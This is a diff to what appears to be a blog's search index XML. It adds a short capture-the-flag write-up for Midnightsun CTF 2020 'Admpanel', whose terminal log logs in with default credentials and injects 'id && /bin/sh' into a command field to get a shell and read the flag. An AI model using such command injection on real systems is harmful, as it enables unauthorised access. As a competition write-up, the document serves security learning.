@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>MidnightsunCTF 2020 Admpanel</title>
+      <link href="/2020/04/04/Midnightsun-CTF-2020-pwn-Admpanel-wp/"/>
+      <url>/2020/04/04/Midnightsun-CTF-2020-pwn-Admpanel-wp/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Admpanel"><a href="#Admpanel" class="headerlink" title="Admpanel"></a>Admpanel</h2><p>input <code>id &amp;&amp; /bin/sh</code> to getshell</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc admpanel-01.play.midnightsunctf.se 31337</span></span><br><span class="line">---=-=-=-=-=-=-=-=-=---</span><br><span class="line">-      Admin panel    -</span><br><span class="line">-</span><br><span class="line">- [0] - Help</span><br><span class="line">- [1] - Authenticate</span><br><span class="line">- [2] - Execute command</span><br><span class="line">- [3] - Exit</span><br><span class="line">---=-=-=-=-=-=-=-=-=---</span><br><span class="line"><span class="meta"> &gt;</span><span class="bash"> 1</span></span><br><span class="line">  Input username: admin</span><br><span class="line">  Input password: password</span><br><span class="line"><span class="meta"> &gt;</span><span class="bash"> 2</span></span><br><span class="line">  Command to execute: id &amp;&amp; /bin/sh</span><br><span class="line">uid=999(ctf) gid=999(ctf) groups=999(ctf)</span><br><span class="line">ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 1 root ctf   4096 Apr  3 05:41 .</span><br><span class="line">drwxr-xr-x 1 root root  4096 Apr  3 05:41 ..</span><br><span class="line">-rwxr-x--- 1 root ctf  14408 Apr  3 13:09 chall</span><br><span class="line">-r--r----- 1 root ctf     41 Apr  2 21:20 flag</span><br><span class="line">-rwxr-x--- 1 root ctf     71 Apr  2 21:20 redir.sh</span><br><span class="line">cat flag</span><br><span class="line">midnight&#123;n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MidnightsunCTF 2020 Admpanel2</title>
       <link href="/2020/04/04/MidnightsunCTF-2020-pwn-Admpanel2/"/>
       <url>/2020/04/04/MidnightsunCTF-2020-pwn-Admpanel2/</url>
@@ -181,11 +206,11 @@
       
         <tags>
             
+            <tag> linux </tag>
+            
             <tag> bof </tag>
             
             <tag> pwn </tag>
-            
-            <tag> linux </tag>
             
             <tag> one_gadget </tag>
             
